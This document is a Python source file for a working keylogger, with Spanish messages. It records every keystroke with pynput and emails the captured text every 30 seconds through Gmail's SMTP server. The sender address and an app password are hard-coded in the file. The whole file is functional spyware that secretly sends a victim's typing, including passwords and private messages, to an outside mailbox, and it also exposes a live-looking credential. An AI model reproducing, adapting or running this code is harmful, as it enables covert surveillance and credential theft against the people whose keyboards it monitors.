#!/bin/python3


import pynput.keyboard
import signal
from termcolor import colored
import threading
import smtplib
from email.mime.text import MIMEText


def def_handler():
    print(colored(f"\n[!] Saliendo del programa....."))

signal.signal(signal.SIGINT, def_handler)


class KeyLogger:

    def __init__(self):
            self.log = ""
            self.request_shutdown = False
            self.timer = None
            self.firts_run = True

    def pressed_key(self, key):

        try: 
            self.log += str(key.char)

        except AttributeError:
            special_keys = {
                key.space: " ",
                key.backspace: " Backspace ",
                key.enter: " Enter ",
                key.shift: " Shift ",
                key.ctrl: " Control ",
                key.alt: " alt "
            }

            self.log += special_keys.get(key, f" {str(key)} ")
 
        
    def send_email(self, subject, body, sender, recipents, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipents)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipents, msg.as_string())
    
        print(colored(f'\n[+] Email send succesfully', 'green'))



    def report(self):
        email_body = "[+] EL keylogger se ha inciado exitosamente" if self.firts_run else self.log
        self.send_email("Keylogger Report", email_body, "valorantlan21@gmail.com", ["valorantlan21@gmail.com"], "djzy agqy iorx lylv")
        self.log = ""

        if self.firts_run:
            self.firts_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()


    def shutdown(self):
        self.request_shutdown = True
        
        if self.timer:
            self.timer.cancel()


    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
